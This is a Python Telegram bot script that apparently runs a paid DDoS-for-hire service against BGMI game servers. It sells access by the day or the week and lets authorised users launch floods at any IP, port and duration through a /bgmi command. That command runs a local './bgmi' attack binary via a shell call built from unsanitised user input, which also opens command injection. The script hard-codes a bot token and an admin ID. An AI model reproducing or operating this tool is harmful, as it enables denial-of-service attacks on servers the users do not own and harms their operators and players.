#bgmiddoserpython

import telebot
import subprocess
import datetime
import os


# Insert your Telegram bot token here
bot = telebot.TeleBot('7157494446:AAFEEhr9AaRODzWJCg7UxJugTQOVh7Npf3s')

# Admin user IDs
admin_id = {"7028472133"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"𝙐𝙨𝙚𝙧 {user_to_add} 𝘼𝙙𝙙𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 👍."
            else:
                response = "𝙐𝙨𝙚𝙧 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙚𝙭𝙞𝙨𝙩𝙨 🤦‍♂️."
        else:
            response = "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙚𝙘𝙞𝙛𝙮 𝙖 𝙪𝙨𝙚𝙧 𝙄𝘿 𝙩𝙤 𝙖𝙙𝙙 😒."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 💀"

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙐𝙨𝙚𝙧 {user_to_remove} 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 👍."
            else:
                response = f"𝙐𝙨𝙚𝙧 {user_to_remove} 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙩𝙝𝙚 𝙡𝙞𝙨𝙩 ."
        else:
            response = '''𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙥𝙚𝙘𝙞𝙛𝙮 𝘼 𝙐𝙨𝙚𝙧 𝙄𝘿 𝙩𝙤 𝙍𝙚𝙢𝙤𝙫𝙚. 
✅ Usage: /remove <userid>'''
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 💀"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙇𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙. 𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ."
                else:
                    file.truncate(0)
                    response = "𝙇𝙤𝙜𝙨 𝘾𝙡𝙚𝙖𝙧𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
        except FileNotFoundError:
            response = "𝙇𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 ."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 💀"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 "
        except FileNotFoundError:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 "
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 💀"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ."
                bot.reply_to(message, response)
        else:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 "
            bot.reply_to(message, response)
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 💀"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 💀🔥\n\n𝙏𝙖𝙧𝙜𝙚𝙩: {target}\n𝙋𝙤𝙧𝙩: {port}\n𝙏𝙞𝙢𝙚: {time} Seconds\n𝙈𝙚𝙩𝙝𝙤𝙙 : BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 650:
                response = "Error: Time interval must be less than 650."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 650"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "𝙮𝙤𝙪'𝙧𝙚 𝙣𝙤𝙩 𝙖 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙪𝙨𝙚𝙧 🥲. 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 @JODxPREDATOR"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝙮𝙤𝙪'𝙧𝙚 𝙣𝙤𝙩 𝙖 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙪𝙨𝙚𝙧 🥲"

    bot.reply_to(message, response)


@bot.message_handler(commands=['attack'])
def show_help(message):
    help_text ='''🤖 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
💥 /bgmi : 𝙈𝙚𝙩𝙝𝙤𝙙 𝙁𝙤𝙧 𝘽𝙜𝙢𝙞 𝙎𝙚𝙧𝙫𝙚𝙧𝙨. 
💥 /rules : 𝙋𝙡𝙚𝙖𝙨𝙚 𝘾𝙝𝙚𝙘𝙠 𝘽𝙚𝙛𝙤𝙧𝙚 𝙐𝙨𝙚 !!.
💥 /mylogs : 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠 𝙔𝙤𝙪𝙧 𝙍𝙚𝙘𝙚𝙣𝙩𝙨 𝘼𝙩𝙩𝙖𝙘𝙠𝙨.
💥 /plan : 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙊𝙪𝙧 𝘿𝘿𝙤𝙎 𝙋𝙧𝙞𝙘𝙚.

🤖 𝙏𝙤 𝙎𝙚𝙚 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
💥 /admincmd : 𝙎𝙝𝙤𝙬𝙨 𝘼𝙡𝙡 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘿𝘿𝙊𝙎𝙭𝙋𝙍𝙀𝘿𝘼𝙏𝙊𝙍 💀🔥, {user_name}! .
🤖 𝙍𝙪𝙣 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 : /attack
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝙋𝙡𝙚𝙖𝙨𝙚 𝙁𝙤𝙡𝙡𝙤𝙬 𝙏𝙝𝙚𝙨𝙚 𝙍𝙪𝙡𝙚𝙨 ⚠️:

1. 𝘿𝙤𝙣𝙩 𝙍𝙪𝙣 𝙏𝙤𝙤 𝙈𝙖𝙣𝙮 𝘼𝙩𝙩𝙖𝙘𝙠𝙨 !! 𝘾𝙖𝙪𝙨𝙚 𝘼 𝘽𝙖𝙣 𝙁𝙧𝙤𝙢 𝘽𝙤𝙩
2. 𝘿𝙤𝙣𝙩 𝙍𝙪𝙣 2 𝘼𝙩𝙩𝙖𝙘𝙠𝙨 𝘼𝙩 𝙎𝙖𝙢𝙚 𝙏𝙞𝙢𝙚 𝘽𝙚𝙘𝙯 𝙄𝙛 𝙐 𝙏𝙝𝙚𝙣 𝙐 𝙂𝙤𝙩 𝘽𝙖𝙣𝙣𝙚𝙙 𝙁𝙧𝙤𝙢 𝘽𝙤𝙩. 
3. 𝙒𝙚 𝘿𝙖𝙞𝙡𝙮 𝘾𝙝𝙚𝙘𝙠𝙨 𝙏𝙝𝙚 𝙇𝙤𝙜𝙨 𝙎𝙤 𝙁𝙤𝙡𝙡𝙤𝙬 𝙩𝙝𝙚𝙨𝙚 𝙧𝙪𝙡𝙚𝙨 𝙩𝙤 𝙖𝙫𝙤𝙞𝙙 𝘽𝙖𝙣!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝘽𝙧𝙤𝙩𝙝𝙚𝙧 𝙊𝙣𝙡𝙮 1 𝙋𝙡𝙖𝙣 𝙄𝙨 𝙋𝙤𝙬𝙚𝙧𝙛𝙪𝙡𝙡 𝙏𝙝𝙚𝙣 𝘼𝙣𝙮 𝙊𝙩𝙝𝙚𝙧 𝘿𝙙𝙤𝙨 !!:

𝙑𝙄𝙋 🌟 :
-> 𝘼𝙩𝙩𝙖𝙘𝙠 𝙏𝙞𝙢𝙚 : 240 Seconds
> 𝘼𝙛𝙩𝙚𝙧 𝘼𝙩𝙩𝙖𝙘𝙠 𝙇𝙞𝙢𝙞𝙩t : 5 Mint 
-> 𝘾𝙤𝙣𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 : 3000

𝗣𝗿𝗶𝗰𝗲 𝗹𝗶𝘀𝘁 💸 :
𝗗𝗮𝘆-->150 𝗥𝘀
𝗪𝗲𝗲𝗸-->700 𝗥𝘀
𝗠𝗼𝗻𝘁𝗵--> 𝗡𝗢𝗧 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗬𝗘𝗧

𝗗𝗠 -> @JODxPREDATOR
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝘼𝙧𝙚 𝙃𝙚𝙧𝙚!!:

⚡ /add <userId> : 𝘼𝙙𝙙 𝙖 𝙐𝙨𝙚𝙧.
⚡ /remove <userid> 𝙍𝙚𝙢𝙤𝙫𝙚 𝙖 𝙐𝙨𝙚𝙧.
⚡ /allusers : 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝙐𝙨𝙚𝙧𝙨 𝙇𝙞𝙨𝙩𝙨.
⚡ /logs : 𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨 𝙇𝙤𝙜𝙨.
⚡ /broadcast : 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙖 𝙈𝙚𝙨𝙨𝙖𝙜𝙚.
⚡ /clearlogs : 𝘾𝙡𝙚𝙖𝙧 𝙏𝙝𝙚 𝙇𝙤𝙜𝙨 𝙁𝙞𝙡𝙚.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙎𝙚𝙣𝙩 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙏𝙤 𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨 👍."
        else:
            response = "🤖 𝙋𝙡𝙚𝙖𝙨𝙚 𝙋𝙧𝙤𝙫𝙞𝙙𝙚 𝘼 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙏𝙤 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 💀"

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
